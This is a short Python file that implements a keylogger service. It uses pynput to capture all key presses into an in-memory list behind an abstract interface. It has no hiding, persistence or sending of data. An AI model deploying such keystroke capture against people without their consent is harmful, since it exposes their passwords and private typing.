from abc import ABC, abstractmethod
from typing import List
from pynput import keyboard


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.keys = []
        self.listener = None

    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            self.keys.append(str(key))

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.keys
